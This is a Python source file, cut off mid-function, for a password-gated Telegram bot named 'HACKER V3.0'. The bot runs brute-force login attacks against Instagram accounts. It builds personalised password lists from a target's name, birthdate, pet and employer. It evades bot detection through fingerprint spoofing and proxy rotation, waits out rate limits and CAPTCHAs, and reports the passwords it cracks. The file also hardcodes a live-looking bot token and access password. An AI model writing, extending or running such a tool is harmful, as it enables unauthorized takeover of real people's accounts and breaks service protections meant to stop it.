import asyncio
import logging
import random
import time
import json
import re
import requests
import itertools
from typing import List, Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.error import TelegramError
import os
from playwright.async_api import async_playwright
from concurrent.futures import ThreadPoolExecutor, as_completed

# Log ayarları
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Telegram bot token
TOKEN = "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU"

# Güvenlik şifresi
BOT_PASSWORD = "vio1911"

# CUPP tarzı şifre oluşturucu için yapılandırma
class PasswordGenerator:
    def __init__(self):
        self.config = {
            "chars": ['!', '@', '#', '$', '%', '&', '*', '(', ')', '-', '+', '=', '?'],
            "years": [str(year) for year in range(1980, 2026)],
            "numfrom": 0,
            "numto": 100
        }
        self.leet_rules = {
            'a': ['@', '4'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'],
            's': ['5', '$'], 't': ['7'], 'l': ['1'], 'b': ['8']
        }
        self.max_password_length = 512

    def generate_wordlist(self, profile: dict, max_passwords: int = 10000) -> List[str]:
        wordlist = []
        firstname = profile.get("firstname", "").lower()[:20]
        lastname = profile.get("lastname", "").lower()[:20]
        birthdate = profile.get("birthdate", "").replace("/", "")[:8]
        pet = profile.get("pet", "").lower()[:20]
        company = profile.get("company", "").lower()[:20]
        keywords = [k[:20] for k in profile.get("keywords", [])]

        # Temel kelimeler
        base_words = [word for word in [firstname, lastname, pet, company] if word]
        base_words.extend(keywords)

        # Doğum tarihi varyasyonları
        birthdate_formats = []
        if birthdate and len(birthdate) == 8:
            dd, mm, yyyy = birthdate[:2], birthdate[2:4], birthdate[4:]
            birthdate_formats.extend([dd, mm, yyyy, yyyy[-2:], yyyy[-3:], f"{dd}{mm}", f"{mm}{dd}", f"{dd}{yyyy}", f"{mm}{yyyy}"])

        # Kelime kombinasyonları
        for word in base_words:
            if len(word) <= self.max_password_length:
                wordlist.append(word)
                wordlist.append(word.capitalize())
            for year in birthdate_formats + self.config["years"]:
                if len(f"{word}{year}") <= self.max_password_length:
                    wordlist.append(f"{word}{year}")
                    wordlist.append(f"{year}{word}")
            for num in range(self.config["numfrom"], self.config["numto"] + 1):
                if len(f"{word}{num:02d}") <= self.max_password_length:
                    wordlist.append(f"{word}{num:02d}")
                    wordlist.append(f"{num:02d}{word}")

        # Çift kelime kombinasyonları
        for w1, w2 in itertools.combinations(base_words, 2):
            if len(f"{w1}{w2}") <= self.max_password_length:
                wordlist.append(f"{w1}{w2}")
                wordlist.append(f"{w2}{w1}")
                wordlist.append(f"{w1.capitalize()}{w2.capitalize()}")
            for year in birthdate_formats + self.config["years"]:
                if len(f"{w1}{w2}{year}") <= self.max_password_length:
                    wordlist.append(f"{w1}{w2}{year}")
                    wordlist.append(f"{w2}{w1}{year}")

        # Leet mode
        if profile.get("leetmode", False):
            leet_words = []
            for word in wordlist[:]:
                leet_variations = [word]
                for char, replacements in self.leet_rules.items():
                    new_variations = []
                    for var in leet_variations:
                        if char in var.lower():
                            for repl in replacements:
                                new_var = var.replace(char, repl).replace(char.upper(), repl)
                                if len(new_var) <= self.max_password_length:
                                    new_variations.append(new_var)
                    leet_variations.extend(new_variations)
                leet_words.extend(leet_variations)
            wordlist.extend(leet_words)

        # Özel karakterler
        if profile.get("spechars", False):
            special_words = []
            for word in wordlist[:]:
                for char in self.config["chars"]:
                    if len(f"{word}{char}") <= self.max_password_length:
                        special_words.append(f"{word}{char}")
                    for char2 in self.config["chars"]:
                        if len(f"{word}{char}{char2}") <= self.max_password_length:
                            special_words.append(f"{word}{char}{char2}")
            wordlist.extend(special_words)

        # Rastgele sayılar
        if profile.get("randnum", False):
            numbered_words = []
            for word in wordlist[:]:
                for num in range(self.config["numfrom"], self.config["numto"] + 1):
                    if len(f"{word}{num:02d}") <= self.max_password_length:
                        numbered_words.append(f"{word}{num:02d}")
            wordlist.extend(numbered_words)

        return list(set(wordlist))[:max_passwords]

class InstagramBruteForce:
    """Instagram brute-force işlemleri için Playwright tabanlı sınıf"""
    
    def __init__(self, user_agent: str = None, proxy_list: List[str] = None):
        self.user_agent = user_agent or self._get_realistic_user_agent()
        self.proxy_list = proxy_list or []
        self.proxy_cycle = itertools.cycle(self.proxy_list) if self.proxy_list else None
        self.current_proxy = None
        self.login_url = 'https://www.instagram.com/accounts/login/'
        self.playwright = None
        self.browser = None
        self.page = None

    def _get_realistic_user_agent(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
        ]
        return random.choice(agents)

    async def _initialize_playwright(self):
        """Playwright'ı başlat ve tarayıcıyı stealth modda ayarla"""
        try:
            self.playwright = await async_playwright().start()
            screen_width = random.randint(1280, 1920)
            screen_height = random.randint(720, 1080)
            languages = ['en-US', 'en-GB', 'tr-TR', 'fr-FR', 'de-DE']
            language = random.choice(languages)
            
            launch_options = {
                'headless': True,
                'args': [
                    '--no-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-blink-features=AutomationControlled',
                    f'--user-agent={self.user_agent}',
                    f'--window-size={screen_width},{screen_height}',
                    f'--lang={language}'
                ]
            }
            
            if self.current_proxy:
                launch_options['proxy'] = {'server': self.current_proxy}
            
            self.browser = await self.playwright.chromium.launch(**launch_options)
            context = await self.browser.new_context(
                viewport={'width': screen_width, 'height': screen_height},
                locale=language,
                timezone_id=random.choice(['Europe/Istanbul', 'America/New_York', 'Asia/Tokyo']),
                java_script_enabled=True,
                is_mobile=False
            )
            
            self.page = await context.new_page()
            
            await self.page.add_init_script("""
                delete navigator.__proto__.webdriver;
                Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
                Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
                Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => Math.floor(Math.random() * 8 + 4) });
                Object.defineProperty(navigator, 'deviceMemory', { get: () => Math.floor(Math.random() * 8 + 4) });
                const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
                HTMLCanvasElement.prototype.toDataURL = function(type, quality) {
                    if (type === 'image/png') {
                        const ctx = this.getContext('2d');
                        ctx.fillStyle = `rgba(${Math.random() * 255},${Math.random() * 255},${Math.random() * 255},0.01)`;
                        ctx.fillRect(0, 0, 1, 1);
                    }
                    return originalToDataURL.apply(this, [type, quality]);
                };
            """)
            
            await self.page.mouse.move(random.randint(100, 500), random.randint(100, 500))
            await self.page.mouse.click(random.randint(100, 500), random.randint(100, 500))
            
            return True
        except Exception as e:
            logger.error(f"Playwright başlatma hatası: {e}")
            return False

    async def _get_working_proxy(self, progress_callback: Optional[callable] = None):
        """Çalışan proxy bul (multi-thread)"""
        if not self.proxy_list:
            if progress_callback:
                await progress_callback("⚠️ Proxy listesi boş, proxysiz devam ediliyor...")
            return None
        
        def test_proxy(proxy):
            try:
                test_session = requests.Session()
                test_session.proxies = {'http': proxy, 'https': proxy}
                response = test_session.get('https://www.instagram.com', timeout=5)
                return proxy if response.status_code == 200 else None
            except Exception:
                return None
        
        working_proxy = None
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_proxy = {executor.submit(test_proxy, proxy): proxy for proxy in self.proxy_list}
            for future in as_completed(future_to_proxy):
                result = future.result()
                if result:
                    working_proxy = result
                    break
        
        if working_proxy:
            if progress_callback:
                await progress_callback(f"✅ Çalışan proxy bulundu: {working_proxy}")
            return working_proxy
        else:
            if progress_callback:
                await progress_callback("❌ Hiçbir proxy çalışmıyor, proxysiz devam ediliyor...")
            return None

    async def _analyze_response_logs(self, page_content: str, current_url: str):
        """Sayfa içeriğini ve logları detaylı analiz et"""
        log_data = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'url': current_url,
            'content_length': len(page_content),
            'potential_indicators': []
        }
        
        indicators = [
            ('rate_limit', 'Rate limit exceeded|Too many requests'),
            ('account_locked', 'Your account has been temporarily locked|suspended'),
            ('login_required', 'Login required|Please log in'),
            ('unexpected_redirect', 'accounts/login|checkpoint'),
            ('potential_success', 'home|explore|direct|onetap')
        ]
        
        for indicator_name, pattern in indicators:
            if re.search(pattern, page_content, re.IGNORECASE) or pattern in current_url:
                log_data['potential_indicators'].append(indicator_name)
        
        log_file = 'instagram_response.json'
        try:
            with open(log_file, 'a', encoding='utf-8') as f:
                json.dump(log_data, f, ensure_ascii=False)
                f.write('\n')
        except Exception as e:
            logger.error(f"Log dosyasına yazma hatası: {e}")
        
        indicators_str = ', '.join(log_data['potential_indicators']) if log_data['potential_indicators'] else 'Hiçbir özel durum tespit edilmedi'
        logger.info(f"Log analizi: {indicators_str}")
        
        if 'rate_limit' in log_data['potential_indicators']:
            logger.info("Rate limit tespit edildi, bekleniyor...")
            await asyncio.sleep(random.uniform(300, 600))  # 5-10 dakika bekle
        
        return indicators_str

    async def _playwright_login_attempt(self, username: str, password: str):
        """Playwright ile login denemesi"""
        try:
            if not self.page:
                if not await self._initialize_playwright():
                    self.current_proxy = await self._get_working_proxy(None)
                    return "ERROR"
            
            await self.page.goto(self.login_url)
            await self.page.wait_for_selector('input[name="username"]', timeout=10000)
            
            if await self.page.query_selector('img[src*="captcha"]'):
                logger.info("CAPTCHA tespit edildi, bekleniyor...")
                await asyncio.sleep(random.uniform(30, 60))
                await self.page.goto(self.login_url)
                self.current_proxy = await self._get_working_proxy(None)
                return "SUSPECTED"
            
            await self.page.type('input[name="username"]', username, delay=random.uniform(50, 150))
            await self.page.type('input[name="password"]', password, delay=random.uniform(50, 150))
            
            await self.page.click('button[type="submit"]')
            
            await asyncio.sleep(3)
            
            current_url = self.page.url
            page_content = await self.page.content()
            
            if any(indicator in current_url for indicator in ['/', '/direct/', '/explore/', '/accounts/onetap/']):
                if 'accounts/login' not in current_url:
                    return "SUCCESS"
            
            if any(indicator in current_url for indicator in ['two_factor', '2fa']) or \
               any(indicator in page_content for indicator in ['two_factor', 'Enter the 6-digit code']):
                return "2FA"
            
            if 'checkpoint' in current_url or 'challenge' in current_url:
                return "CHECKPOINT"
            
            error_indicators = [
                'Sorry, your password was incorrect',
                'The username you entered',
                'incorrect',
                'doesn\'t match',
                'kullanıcı adı',
                'Hatalı şifre',
                'Şifre yanlış'
            ]
            
            if any(indicator in page_content for indicator in error_indicators):
                return "WRONG"
            
            logger.info("Bilinmeyen yanıt alındı, loglar inceleniyor...")
            indicators = await self._analyze_response_logs(page_content, current_url)
            if 'potential_success' in indicators or 'checkpoint' in indicators:
                self.current_proxy = await self._get_working_proxy(None)
                return "SUSPECTED"
            self.current_proxy = await self._get_working_proxy(None)
            return "ERROR"
            
        except Exception as e:
            logger.error(f"Playwright login hatası: {e}")
            self.current_proxy = await self._get_working_proxy(None)
            return "ERROR"
        finally:
            if self.browser:
                await self.browser.close()
            if self.playwright:
                await self.playwright.stop()

    async def brute_force(self, username: str, password_list: List[str], timeout: int, 
                         progress_callback: Optional[callable] = None, stop_event: asyncio.Event = None):
        """Brute-force saldırısını paralel olarak gerçekleştir"""
        start_time = time.time()
        total_passwords = len(password_list)
        tried_passwords = 0
        suspected_passwords = []
        attempt_logs = []
        
        try:
            await progress_callback(f"\n{'='*50}\nInstagram Brute Force Başlatılıyor\nHedef: {username}\nToplam şifre: {total_passwords}\nTimeout: {timeout} saniye\n{'='*50}\n")
            
            # Şifreleri 10'lu gruplara ayır
            chunk_size = 10
            password_chunks = [password_list[i:i + chunk_size] for i in range(0, len(password_list), chunk_size)]
            
            async def process_chunk(chunk, chunk_index):
                nonlocal tried_passwords
                core = InstagramBruteForce(proxy_list=self.proxy_list)
                chunk_logs = []
                
                for password in chunk:
                    if stop_event and stop_event.is_set():
                        await progress_callback("🛑 Saldırı kullanıcı tarafından durduruldu!")
                        return None, chunk_logs
                    
                    if time.time() - start_time > timeout:
                        await progress_callback(f"\n⏰ Timeout ({timeout}s) aşıldı! Denenen şifre: {tried_passwords}/{total_passwords}")
                        return None, chunk_logs
                    
                    start_attempt = time.time()
                    result = await core._playwright_login_attempt(username, password)
                    duration = time.time() - start_attempt
                    
                    chunk_logs.append({
                        'password': password,
                        'result': result,
                        'proxy': core.current_proxy,
                        'duration': duration
                    })
                    
                    await progress_callback(f"🔐 Şifre deneniyor: {password} (Grup {chunk_index+1})")
                    
                    if result == "SUCCESS":
                        await progress_callback(f"🎉 BAŞARILI! Şifre bulundu: {password}")
                        return password, chunk_logs
                    elif result in ["2FA", "CHECKPOINT"]:
                        await progress_callback(f"🔐 Doğru şifre ama ek doğrulama gerekli: {password}")
                        return password, chunk_logs
                    elif result == "WRONG":
                        await progress_callback(f"❌ Yanlış şifre: {password}")
                    elif result == "SUSPECTED":
                        await progress_callback(f"⚠️ Şüpheli şifre tespit edildi, tekrar denenecek: {password}")
                        suspected_passwords.append(password)
                    else:
                        await progress_callback(f"❓ Hata: {password}")
                        suspected_passwords.append(password)
                    
                    tried_passwords += 1
                    delay = random.uniform(3, 8)
                    await asyncio.sleep(delay)
                
                return None, chunk_logs
            
            # Paralel deneme
            tasks = [process_chunk(chunk, i) for i, chunk in enumerate(password_chunks)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result, chunk_logs in results:
                if result:
                    # Rapor oluştur
                    report = f"📊 Rapor:\n- Denenen şifre sayısı: {tried_passwords}/{total_passwords}\n"
                    if suspected_passwords:
                        report += f"- Şüpheli şifreler tekrar denendi: {len(suspected_passwords)}\n"
                    report += "\n📋 Detaylı Deneme Logları:\n"
                    for log in attempt_logs:
                        report += f"- Şifre: {log['password']}, Sonuç: {log['result']}, Proxy: {log['proxy'] or 'Yok'}, Süre: {log['duration']:.2f}s\n"
                    report += f"\n🎉 BAŞARILI! Şifre bulundu: {result}"
                    report_file = f"report_{username}_{int(time.time())}.txt"
                    with open(report_file, 'w', encoding='utf-8') as f:
                        f.write(report)
                    return result, report_file
                attempt_logs.extend(chunk_logs)
            
            # Şüpheli şifreleri otomatik tekrar deneme
            if suspected_passwords:
                await progress_callback(f"\n🔄 Şüpheli şifreler ({len(suspected_passwords)}) tekrar deneniyor...")
                suspected_chunks = [suspected_passwords[i:i + chunk_size] for i in range(0, len(suspected_passwords), chunk_size)]
                tasks = [process_chunk(chunk, i) for i, chunk in enumerate(suspected_chunks)]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result, chunk_logs in results:
                    if result:
                        # Rapor oluştur
                        report = f"📊 Rapor:\n- Denenen şifre sayısı: {tried_passwords}/{total_passwords}\n"
                        if suspected_passwords:
                            report += f"- Şüpheli şifreler tekrar denendi: {len(suspected_passwords)}\n"
                        report += "\n📋 Detaylı Deneme Logları:\n"
                        for log in attempt_logs:
                            report += f"- Şifre: {log['password']}, Sonuç: {log['result']}, Proxy: {log['proxy'] or 'Yok'}, Süre: {log['duration']:.2f}s\n"
                        report += f"\n🎉 BAŞARILI! Şifre bulundu: {result}"
                        report_file = f"report_{username}_{int(time.time())}.txt"
                        with open(report_file, 'w', encoding='utf-8') as f:
                            f.write(report)
                        return result, report_file
                    attempt_logs.extend(chunk_logs)
            
            # Rapor oluştur
            report = f"📊 Rapor:\n- Denenen şifre sayısı: {tried_passwords}/{total_passwords}\n"
            if suspected_passwords:
                report += f"- Şüpheli şifreler tekrar denendi: {len(suspected_passwords)}\n"
            report += "\n📋 Detaylı Deneme Logları:\n"
            for log in attempt_logs:
                report += f"- Şifre: {log['password']}, Sonuç: {log['result']}, Proxy: {log['proxy'] or 'Yok'}, Süre: {log['duration']:.2f}s\n"
            report += "- Doğru şifre bulunamadı."
            report_file = f"report_{username}_{int(time.time())}.txt"
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write(report)
            
            await progress_callback(report)
            return None, report_file
            
        except Exception as e:
            logger.error(f"Brute force hatası: {e}")
            await progress_callback(f"❌ Beklenmeyen hata: {str(e)}")
            report = f"📊 Rapor:\n- Denenen şifre sayısı: {tried_passwords}/{total_passwords}\n- Hata: {str(e)}"
            report_file = f"report_{username}_{int(time.time())}.txt"
            with open(report_file, 'w', encoding='utf-8') as f:
                f.write(report)
            return None, report_file

class TelegramBot:
    def __init__(self):
        self.user_data = {}
        self.brute_force_tasks = {}
        self.brute_force_stop_events = {}
        self.password_generator = PasswordGenerator()

    def _initialize_user_data(self, user_id: int):
        if user_id not in self.user_data:
            self.user_data[user_id] = {
                'username': None,
                'password_file': None,
                'proxy_file': None,
                'timeout': 1800,
                'max_passwords': 10000,
                'password_profile': {
                    'firstname': '', 'lastname': '', 'birthdate': '',
                    'pet': '', 'company': '', 'keywords': [],
                    'leetmode': False, 'spechars': False, 'randnum': False
                }
            }

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self._initialize_user_data(user_id)
        try:
            await update.message.reply_text("🔒 Lütfen bot şifresini girin:")
            context.user_data['awaiting'] = 'password'
        except TelegramError as e:
            logger.error(f"Telegram send_message error: {e}")

    async def stop_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Saldırıyı durdurma komutu"""
        user_id = update.effective_user.id
        
        if user_id in self.brute_force_stop_events:
            self.brute_force_stop_events[user_id].set()
            await update.message.reply_text("🛑 Saldırı durduruluyor...")
        else:
            await update.message.reply_text("❌ Durdurulacak aktif saldırı bulunamadı.")

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self._initialize_user_data(user_id)

        awaiting = context.user_data.get('awaiting')
        if not awaiting:
            try:
                await update.message.reply_text("❌ Önce /start komutunu kullan!")
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
            return

        if awaiting == 'password':
            entered_password = update.message.text.strip() if update.message.text else ""
            if not entered_password:
                try:
                    await update.message.reply_text("❌ Boş şifre girilemez! Lütfen bot şifresini gir.")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
            if entered_password == BOT_PASSWORD:
                context.user_data['awaiting'] = None
                welcome_message = "👾 HACKER V3.0 AKTİF! 👾\n🔥 Hoş geldin V.VV SUNAR KEYFİNE BAK 🔥"
                keyboard = [
                    [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
                    [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
                    [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
                    [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
                    [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
                    [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
                    [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                try:
                    await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                    await update.message.reply_text("❌ Hoş geldin mesajı gönderilirken hata oluştu, lütfen /start ile tekrar dene!")
            else:
                try:
                    await update.message.reply_text("❌ Yanlış şifre! Tekrar dene.")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
        elif awaiting == 'username':
            if not update.message.text or not update.message.text.strip():
                try:
                    await update.message.reply_text("❌ Boş kullanıcı adı girilemez! Lütfen geçerli bir kullanıcı adı gir.")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
            username = update.message.text.strip()
            if len(username) > 30:
                try:
                    await update.message.reply_text("❌ Kullanıcı adı 30 karakterden uzun olamaz!")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
            self.user_data[user_id]['username'] = username
            try:
                await update.message.reply_text(f"✅ Kullanıcı adı ayarlandı: {self.user_data[user_id]['username']}")
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif awaiting == 'password_file':
            if update.message.document:
                file = await update.message.document.get_file()
                file_path = f"passwords_{user_id}.txt"
                await file.download_to_drive(file_path)
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        passwords = [line.strip() for line in f if line.strip() and len(line.strip()) <= 512]
                    if not passwords:
                        try:
                            await update.message.reply_text("❌ Şifre listesi boş veya geçersiz! Lütfen geçerli bir .txt dosyası yükle.")
                            os.remove(file_path)
                        except TelegramError as e:
                            logger.error(f"Telegram send_message error: {e}")
                        return
                    self.user_data[user_id]['password_file'] = file_path
                    try:
                        await update.message.reply_text(f"✅ Şifre listesi yüklendi! ({len(passwords)} şifre)")
                    except TelegramError as e:
                        logger.error(f"Telegram send_message error: {e}")
                except Exception as e:
                    try:
                        await update.message.reply_text(f"❌ Dosya okunamadı: {str(e)}")
                        os.remove(file_path)
                    except TelegramError as e:
                        logger.error(f"Telegram send_message error: {e}")
                    return
            else:
                try:
                    await update.message.reply_text("❌ Lütfen bir .txt dosyası yükle!")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
        elif awaiting == 'proxy_file':
            if update.message.document:
                file = await update.message.document.get_file()
                file_path = f"proxies_{user_id}.txt"
                await file.download_to_drive(file_path)
                self.user_data[user_id]['proxy_file'] = file_path
                try:
                    await update.message.reply_text("✅ Proxy listesi yüklendi!")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
            else:
                try:
                    await update.message.reply_text("❌ Lütfen bir .txt dosyası yükle!")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
        elif awaiting == 'timeout':
            if not update.message.text or not update.message.text.strip():
                try:
                    await update.message.reply_text("❌ Boş timeout değeri girilemez! Lütfen geçerli bir sayı gir.")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
            try:
                timeout = int(update.message.text)
                if 60 <= timeout <= 7200:
                    self.user_data[user_id]['timeout'] = timeout
                    try:
                        await update.message.reply_text(f"✅ Timeout ayarlandı: {timeout} saniye")
                    except TelegramError as e:
                        logger.error(f"Telegram send_message error: {e}")
                else:
                    try:
                        await update.message.reply_text("❌ Timeout 60-7200 saniye arasında olmalı!")
                    except TelegramError as e:
                        logger.error(f"Telegram send_message error: {e}")
            except ValueError:
                try:
                    await update.message.reply_text("❌ Lütfen geçerli bir sayı gir!")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
        elif awaiting == 'max_passwords':
            if not update.message.text or not update.message.text.strip():
                try:
                    await update.message.reply_text("❌ Boş şifre sayısı girilemez! Lütfen geçerli bir sayı gir (100-50000).")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
            try:
                max_passwords = int(update.message.text)
                if 100 <= max_passwords <= 50000:
                    self.user_data[user_id]['max_passwords'] = max_passwords
                    try:
                        await update.message.reply_text(f"✅ Maksimum şifre sayısı ayarlandı: {max_passwords}")
                        await update.message.reply_text("📝 Adı gir (boş bırakmak için butona bas):")
                        context.user_data['awaiting'] = 'generate_firstname'
                    except TelegramError as e:
                        logger.error(f"Telegram send_message error: {e}")
                else:
                    try:
                        await update.message.reply_text("❌ Şifre sayısı 100-50000 arasında olmalı!")
                    except TelegramError as e:
                        logger.error(f"Telegram send_message error: {e}")
            except ValueError:
                try:
                    await update.message.reply_text("❌ Lütfen geçerli bir sayı gir!")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
        elif awaiting == 'generate_firstname':
            firstname = update.message.text.strip() if update.message.text else ""
            if len(firstname) > 20:
                try:
                    await update.message.reply_text("❌ Ad 20 karakterden uzun olamaz!")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
            self.user_data[user_id]['password_profile']['firstname'] = firstname
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_lastname')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await update.message.reply_text("📝 Soyadı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_lastname'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
            return
        elif awaiting == 'generate_lastname':
            lastname = update.message.text.strip() if update.message.text else ""
            if len(lastname) > 20:
                try:
                    await update.message.reply_text("❌ Soyad 20 karakterden uzun olamaz!")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
            self.user_data[user_id]['password_profile']['lastname'] = lastname
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_birthdate')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await update.message.reply_text("📝 Doğum tarihi gir (DDMMYYYY, ör: 05071978, boş bırakmak için butona bas):", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_birthdate'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
            return
        elif awaiting == 'generate_birthdate':
            birthdate = update.message.text.strip() if update.message.text else ""
            if birthdate and (len(birthdate) != 8 or not birthdate.isdigit()):
                try:
                    await update.message.reply_text("❌ Doğum tarihi 8 haneli olmalı (DDMMYYYY)! Tekrar dene:")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
            self.user_data[user_id]['password_profile']['birthdate'] = birthdate
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_pet')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await update.message.reply_text("📝 Evcil hayvan adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_pet'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
            return
        elif awaiting == 'generate_pet':
            pet = update.message.text.strip() if update.message.text else ""
            if len(pet) > 20:
                try:
                    await update.message.reply_text("❌ Evcil hayvan adı 20 karakterden uzun olamaz!")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
            self.user_data[user_id]['password_profile']['pet'] = pet
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_company')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await update.message.reply_text("📝 Şirket adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_company'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
            return
        elif awaiting == 'generate_company':
            company = update.message.text.strip() if update.message.text else ""
            if len(company) > 20:
                try:
                    await update.message.reply_text("❌ Şirket adı 20 karakterden uzun olamaz!")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
            self.user_data[user_id]['password_profile']['company'] = company
            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_keywords')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await update.message.reply_text("📝 Ek anahtar kelimeler gir (virgülle ayır, ör: hacker,juice, boş bırakmak için butona bas):", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_keywords'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
            return
        elif awaiting == 'generate_keywords':
            keywords = update.message.text.strip() if update.message.text else ""
            keyword_list = [k.strip() for k in keywords.split(',') if k.strip()] if keywords else []
            if any(len(k) > 20 for k in keyword_list):
                try:
                    await update.message.reply_text("❌ Her anahtar kelime 20 karakterden kısa olmalı!")
                except TelegramError as e:
                    logger.error(f"Telegram send_message error: {e}")
                return
            self.user_data[user_id]['password_profile']['keywords'] = keyword_list
            keyboard = [
                [InlineKeyboardButton("Evet", callback_data='leet_yes'), InlineKeyboardButton("Hayır", callback_data='leet_no')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await update.message.reply_text("🔢 Leet mode? (ör: leet → 1337)", reply_markup=reply_markup)
                context.user_data['awaiting'] = 'generate_leet'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
            return

        context.user_data['awaiting'] = None
        keyboard = [
            [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
            [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
            [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
            [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
            [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
            [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
            [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        try:
            await update.message.reply_text("➡️ Başka ne yapmak istersin?", reply_markup=reply_markup)
        except TelegramError as e:
            logger.error(f"Telegram send_message error: {e}")

    async def button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        self._initialize_user_data(user_id)

        if query.data == 'set_username':
            try:
                await query.message.reply_text("🎯 Lütfen Instagram kullanıcı adını gir:")
                context.user_data['awaiting'] = 'username'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'set_password_file':
            try:
                await query.message.reply_text("📜 Lütfen şifre listesi dosyasını (.txt) yükle:")
                context.user_data['awaiting'] = 'password_file'
            except TelegramError as e:
                logger.error(f"Telegram send_message error: {e}")
        elif query.data == 'set_proxy_file':
            try:
